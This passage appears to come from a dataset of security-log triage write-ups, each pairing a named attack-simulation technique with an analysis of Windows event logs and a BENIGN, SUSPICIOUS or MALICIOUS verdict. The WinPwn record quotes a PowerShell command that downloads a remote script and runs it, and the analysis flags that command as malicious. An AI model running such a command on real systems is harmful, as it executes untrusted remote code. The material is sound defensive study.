- **SUSPICIOUS**: The PowerShell activity with `SharpView.exe` and related commands, combined with repeated wevtutil and conhost usages, indicate potentially suspicious behavior. This suggests an attempt to perform reconnaissance, privilege escalation, or execute unauthorized scripts. There is no definitive proof of malicious intent, but these are clear signs of potential compromise that require further investigation.

### Guidance:

1. **Immediate Investigation Needed**:
   - Examine the PowerShell logs more closely to understand the scripts being executed and the exact nature of their activities.
   - Check network logs to determine if data has been exfiltrated or if external connections were made.
   - Verify the integrity and legitimacy of run executables, particularly `SharpView.exe`.
   - Review user activity, especially for the `admin_test` account, for any unauthorized access.

2. **Monitor and Audit**:
   - Enable auditing features to capture detailed logs of subsequent command-line invocations, access patterns, and any changes to system configurations.
   - Set up alerts or notifications for high-risk activities, such as unexpected PowerShell script execution or privilege escalations.

3. **Security Protocol Enhancement**:
   - Implement stronger access controls and consider restricting the use of high-risk functions/tools like PowerShell for non-administrative purposes unless explicitly required.
   - Conduct a security awareness session and reinforce adherence to policies on the use of administrative accounts and high-integrity tools.

The findings suggest strong grounds for suspicion, but more evidence is needed to label the activities as fully malicious. Thus, a **SUSPICIOUS** resolution is recommended, calling for further investigation."
Security Software Discovery - AV Discovery via Get-CimInstance and Get-WmiObject cmdlets,"Upon analyzing the provided Windows event logs, I have identified several key activities and patterns. Let's evaluate these findings:

### 1. **Time Synchronization Logs:**
- **Logs from System and Security:** Events indicate time synchronization via the Windows Time Service (`svchost.exe`). The time was adjusted by a very short duration (milliseconds).
- **Interpretation:** Time synchronization via `time.windows.com` is a standard operation and not indicative of suspicious behavior. The `svchost.exe` process invoking this is legitimate.

### 2. **Process Execution Logs in Sysmon:**
- The logs predominantly show executions of system utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, and multiple instances of `MicrosoftEdgeUpdate.exe`. The execution contexts are `SERVER002\admin_test` for `USER` and `NT AUTHORITY\SYSTEM`.
- **Specific Observations:**
  - **`whoami.exe` and `cmd.exe`:** These are legitimate Windows tools. `whoami.exe` is used to display logged-on user information while `cmd.exe` with PowerShell commands (`Get-CimInstance`, `Get-WmiObject`) may fetch information about antivirus status, which can be part of normal administrative tasks or monitoring scripts.
  - **`MicrosoftEdgeUpdate.exe`:** Repeated mentions of this executable reference a legitimate update process for Microsoft Edge. Multiple instances and a temporary filepath (`C:\Program Files (x86)\Microsoft\Temp\`) are consistent with a typical update cycle.

### 3. **Windows PowerShell Logs:**
- These logs show registry, alias, environment, file system, function, and variable operations, specifically tied to PowerShell commands for antivirus checks.
- **Assessment:** These operations do not indicate malicious activity on their own unless unauthorized or unexpected by system policy, suggesting potential routine security checks.

### 4. **Edge Update and Application Logs:**
- Instances of Microsoft Edge update services starting and stopping indicate normal update processes for Microsoft Edge.

### 5. **Security Logs:**
- The security logs show time changes and operations by Windows services; such operations are common and legitimate in a Windows environment.

### Conclusion and Recommendation:
Based on these observations, the logs reflect benign activities. The use of PowerShell to check antivirus status and the regular update attempts for Microsoft Edge, as well as kernel and time service operations, do not raise any immediate flags of a security compromise. Therefore, no indicators of malicious activity were identified.

**Final Resolution: BENIGN - Logs reflect expected system and application operations.** If the behavior of these processes reflects typical administrative actions or authorized security checks, no further investigation is needed. However, routine monitoring should continue to ensure ongoing system integrity."
WinPwn - PowerSharpPack - Watson searching for missing windows patches,"### Analysis:

1. **Application Log:**
   - The application logs indicate that Windows Defender was active and functioning properly, which may suggest that the system's built-in defenses were operational at the time of the event.

2. **PowerShell Log:**
   - Multiple PowerShell events are recorded, each with a similar command invocation:
     ```
     powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/master/scriptBinaries/script.ps1') Invoke-watson}
     ```
   - This command is indicative of a suspicious/malicious activity:
     - The use of `iex(new-object net.webclient).downloadstring()` is commonly associated with web-based script injection attacks that fetch and execute scripts from the internet. This technique is often used to execute malicious payloads and can be an indicator of compromise.

3. **Sysmon Log:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` run by `SERVER002\admin_test`. The `wevtutil.exe` is a legitimate tool used to manage Windows Event logs, but it can also be used by attackers for log manipulation or clearing.
   - The execution of `hostname.exe` and `whoami.exe` is expected as they are used to gather basic system information.
   - The PowerShell execution recorded matches those in the PowerShell logs and shows malicious characteristics as previously noted.

4. **Security Log:**
   - No direct evidence of privilege escalation or unauthorized access in the security logs, but they show a time change, potentially indicating an attempt to alter logs or traces.

5. **System Log:**
   - Details about time synchronization adjustments are observed but no signs of overtly malicious activity.

### Conclusion:

**Resolution: MALICIOUS**

Based on the PowerShell logs which show execution of a script fetched directly from the internet using a known malicious execution pattern, this activity can be confidently classified as malicious. It is crucial to further investigate the script hosted at the provided URL to understand its purpose and impact fully. The suspicious nature of this activity, in conjunction with evidence from the Sysmon logs, forms a strong pattern indicating compromise.

### Recommended Actions:

1. **Immediate Containment:**
   - Disconnect the affected host from the network to prevent further spread or communication with any potential command and control servers.
  
2. **Further Investigation:**
   - Review the script downloaded from GitHub for any malware signatures or malicious functions.
   - Check if other machines in the network executed similar scripts or show signs of compromise.

3. **Remediation:**
   - Clean the infected host by removing the detected malware and restoring from a known good backup.
   - Patch any vulnerabilities discovered during the investigation.

4. **Monitoring and Future Prevention:**
   - Enable advanced threat protection mechanisms and regular monitoring of outbound connections for unusual behavior.
   - Consider implementing application whitelisting to prevent unauthorized scripts from executing."
Process Discovery - PC Hunter,"### Detailed Analysis

#### Security Logs:

1. **Event ID 4672**: Special privileges assigned to new logon, which includes `SeDebugPrivilege`. This is often seen when an account is given administrative privileges. It's not inherently suspicious but worth noting since `SeDebugPrivilege` can be used maliciously to examine or alter system processes.

2. **Event ID 4624**: Successful logon for user `admin_test` with NTLM authentication from `DESKTOP-3HL5B2P`. This could indicate legitimate admin activity or lateral movement attempt from another machine.

3. **Event ID 4634**: Logoff events corresponding to `admin_test`. This shows a session was terminated, possibly indicating cleanup after performing activities.

#### Windows PowerShell Logs:

1. **Event ID 600** across multiple log entries: Repeated PowerShell activity in quick succession, involving the execution of the application `PCHunter64.exe` from `C:\\Temp\\Externalfiles\\PCHunter_free\\`. `PCHunter` is a toolkit used for malware analysis and system monitoring, which could be benign if used by a legitimate security analyst but also suggestive of a security incident response or malware execution monitoring.

#### System Logs:

1. **Event ID 7045**: A service, `MpKsl71eecf46`, was installed with the image path leading to Windows Defender’s definition updates. This appears routine for antivirus activity, not inherently suspicious.

#### Application Logs:

1. **Event ID 4097**: Involves actions related to certificate provider services, indicating certificate operations likely routine for cryptographic operations or debugging.

#### Sysmon Logs:

1. **Events Related to PowerShell and Execution of External Tools**: 
   - The execution of `WindowsPowerShell` followed by `PCHunter64.exe` as detailed through command line entries suggests possible analysis or forensic activity on the host. The use of `PCHunter` is common in security investigations but could also suggest attempts to discover or alter running system processes.
   
2. **Events ID 1** and **ID 5**: Indicate `whoami.exe`, `wevtutil.exe`, and `PCHunter64.exe` activities. The execution of standard tools like `whoami` and `wevtutil` is typical for reconnaissance or information retrieval, which in combination with `PChunter64.exe` suggests system analysis or forensic activities.

### Assessment

Given the above activities, the logs indicate operations typically observed during a forensic investigation or system troubleshooting session by an administrator. The focus on `admin_test` operations, NTLM logins from another machine, and use of investigation tools like `PCHunter`, while carrying elevated privileges, could align with defensive security tasks possibly conducted by a designated security team.

However, the combination of powerful privileges along with tools capable of manipulating or observing deep system processes necessitates further verification to rule out potential misuse or compromise scenarios.

### Resolution

**SUSPICIOUS**: The logs contain activities related to the use of potentially dual-purpose tools and elevated privileges, indicative of system monitoring or analysis. Further investigation is recommended to confirm whether these activities align with authorized security operations or represent unauthorized activity from a potentially compromised account. Consider verifying the legitimacy of actions conducted by the `admin_test` account and the originating IP address `fe80::e3b5:5371:12a8:9c77`."
Discover System Language with chcp,"Upon reviewing the provided Windows event logs, several key observations can be made that require further analysis to determine the nature of the activities logged. Here is a detailed assessment:

### Observations:

1. **Sysmon Logs:**
   - Several executions of `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe` are observed under the user `SERVER002\admin_test`. This could be a part of routine administrative tasks, but frequent and rapid executions merit closer scrutiny.
   - All executions appear to happen in a very close timeframe, indicating a batch execution or script running these commands. This behavior is typical for automated scripts but could also be indicative of malicious activity if unexpected.
   - Notably, `wevtutil.exe` is used to query or clear event logs, and without a command line to specify the action, it can potentially be used to cover tracks during unauthorized or malicious operations.

2. **System Logs:**
   - Time synchronization events are logged, which is a normal behavior as Windows systems often sync with a time server (e.g., `time.windows.com`). This alone does not indicate malicious activity.

3. **Security Logs:**
   - The presence of Event ID `4624` (successful login) and `4672` (special privileges assigned to new logon) logs indicates successful user login sessions with elevated privileges (e.g., `SeDebugPrivilege`, `SeBackupPrivilege`). Elevated privileges are common for administrative accounts but should be reviewed carefully to determine if they align with expected activity.
   - Event ID `4616` showing time change, which may happen for several legitimate reasons (like time synchronization), but it can also be malicious if it is used in conjunction with other activities to bypass time-based security measures.

4. **Application Logs:**
   - There's a mention of the ""Software Protection Platform Service"", which generally operates in the background providing security updates and does not indicate any suspicious activity alone.

### Assessment:

- **Process Executions:** The execution of different standard Windows system utilities like `cmd.exe`, `hostname.exe`, and `whoami.exe` in close succession may indicate either an administrative script or a potential misuse if unauthorized. These are legitimate system utilities but can be used in malicious scripts due to their availability and functionality.
  
- **User Activity:** Given all processes are under `admin_test`, it is critical to verify if this user action is expected. If `admin_test` is known to run certain scripts for server maintenance, this activity might be benign.

- **Privilege Usage:** The logs indicate a user with high privileges performing regular actions. Any abuse of these privileges for unauthorized activities should raise alerts. However, in typical cases, admins might have high privileges for legitimate tasks.

### Conclusion:

**Resolution: SUSPICIOUS**

The current findings in the logs show potentially concerning activity patterns due to the frequent execution of system utilities under an administrative account with highly elevated privileges in a short timeframe. While there are legitimate scenarios where such behavior could be expected, without additional context, this pattern could also be associated with post-exploitation activities in a compromised system.

### Guidance on How to Proceed:

1. **Review Administrative Scripts:** Check if the executions match any scheduled administrative tasks or scripts. Collaborate with IT to confirm if such activities are scheduled and expected.

2. **User Verification:** Validate the use of the `admin_test` account and ensure it's not being misused. Review recent changes in account privileges or any abnormal logins.

3. **Privilege Monitoring:** Continuously monitor the use of high-privilege accounts to ensure they align with organizational policies, potentially integrating alerts for abnormal patterns.

4. **Further Investigation:** Consider deploying further endpoint detection or a network traffic analysis for anomalies, especially if there's no clarity from the aforementioned steps.

5. **Review Event Logs for Tampering:** Given the use of `wevtutil.exe`, ensure event logs have not been tampered with. Re-evaluate whether the logs align with expected retention and integrity policies.

By conducting further investigations based on these guidelines, a clearer picture can be formed to either rule out malicious behavior or take action in response to unauthorized activities."
Process Discovery - wmic process,"Upon reviewing the provided logs, several observations can be made. Here's the breakdown of the analysis:

1. **Security Log Analysis**
   - The Security log shows multiple `EventID 4616`, indicating system time change attempts by the `svchost.exe` process which runs under the `LOCAL SERVICE` account. The alteration of system time can be considered suspicious, especially if done frequently and without administrative intervention. However, there’s no explicit indication that a system time modification was exploited maliciously.

2. **Sysmon Log Analysis**
   - The Sysmon log records a significant number of processes being executed by `admin_test` account, primarily involving legitimate Windows utilities such as `wevtutil.exe`, `conhost.exe`, `WMIC.exe`, `hostname.exe`, and `whoami.exe`.
   - The use of these utilities, in particular `wevtutil.exe` and `WMIC.exe`, could indicate attempts for reconnaissance or to manipulate event logs, which might be components of a larger malicious activity if observed in conjunction with other suspicious behavior.
   - The integrity level for these processes is marked as `High`, indicating they are running with elevated privileges, which could be a legitimate administrative action but could also be concerning if the context of their execution is not clear.
   - The pattern suggests automated activities or scripts being executed, as evident by the repeated invocation of utilities like `cmd.exe` to execute WMIC commands.

3. **System Log Analysis**
   - The System log corroborates the Security log's evidence of system time change events, involving the `svchost.exe` process. The timestamps are indeed reverted, a rare action that could signify tampering but can also occur during legitimate synchronization tasks by the Windows Time service if misconfigured or corrupt.
   - No clear evidence of compromise from typical malware indicators like unauthorized software installations, credential theft, or network anomalies.

**Assessment and Guidance**
- The presence of administrative activities such as time changes and high-integrity CMD/WMIC executions typically performed by administrators can suggest benign maintenance within the system. However, their recurrent and clustered nature without detailed context may raise concerns.

- **Resolution:** **SUSPICIOUS**

The activity reflected in the logs suggests potential misuse or compromise, particularly relating to the use of administrative tools and alterations in system time. It warrants further investigation by:
- Confirming with system administrators or the responsible team if these actions were scheduled and authorized maintenance activities.
- Conducting a more detailed audit trace for the `SERVER002\\admin_test` account activities, with a focus on script or batch job executions during the same timeframe.
- Ensuring that system time modifications were appropriately logged and accounted for, perhaps through verification of NTP configurations and logs.
- Monitoring for any similar activities across other systems in the network to rule out lateral movement or automated compromises."
